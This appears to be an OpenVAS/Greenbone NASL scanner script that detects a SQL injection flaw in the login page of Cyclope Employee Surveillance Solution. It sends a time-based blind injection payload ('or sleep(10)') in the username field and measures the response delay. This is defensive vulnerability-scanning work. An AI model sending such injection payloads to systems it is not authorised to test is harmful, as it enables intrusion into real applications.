if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.803006" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2012-08-14 10:50:03 +0530 (Tue, 14 Aug 2012)" );
	script_name( "Cyclope Employee Surveillance Solution SQL Injection Vulnerability" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/50200" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/20393" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/115406/cyclope-sql.txt" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "httpver.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 7879 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "impact", value: "Successful exploitation will let attackers to manipulate SQL
  queries by injecting arbitrary SQL code." );
	script_tag( name: "affected", value: "Cyclope Employee Surveillance Solution version 6.0.8.5 and
  prior." );
	script_tag( name: "insight", value: "Input passed to 'username' and 'password' parameter in '/index.php'
  page is not properly verified before being used in SQL queries." );
	script_tag( name: "solution", value: "Update to version 6.2.1 or later." );
	script_tag( name: "summary", value: "This host is running Cyclope Employee Surveillance Solution
  and is prone to SQL injection vulnerability." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 7879 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
host = http_host_name( port: port );
url = "/index.php";
rcvRes = http_get_cache( item: url, port: port );
if(rcvRes && IsMatchRegexp( rcvRes, "HTTP/1.. 200" ) && ContainsString( rcvRes, "<title>Cyclope" ) && ContainsString( rcvRes, "Cyclope Employee Surveillance Solution" )){
	postdata1 = "act=auth-login&pag=login&username=xxx&password=aaa";
	req1 = NASLString( "POST ", url, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Content-Length: ", strlen( postdata1 ), "\\r\\n", "\\r\\n", postdata1 );
	nor_start1 = unixtime();
	res = http_keepalive_send_recv( port: port, data: req1 );
	nor_stop1 = unixtime();
	postdata2 = "act=auth-login&pag=login&username=x%27+or+sleep%2810%29+and+" + "%271%27%3D%271&password=aaa";
	req2 = NASLString( "POST ", url, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Content-Length: ", strlen( postdata2 ), "\\r\\n", "\\r\\n", postdata2 );
	nor_start2 = unixtime();
	res = http_keepalive_send_recv( port: port, data: req2 );
	nor_stop2 = unixtime();
	if(res && IsMatchRegexp( res, "HTTP/1.. 200" ) && ( nor_stop1 - nor_start1 ) < 2 && ( nor_stop2 - nor_start2 > 10 )){
		security_message( port: port );
		exit( 0 );
	}
}
exit( 99 );

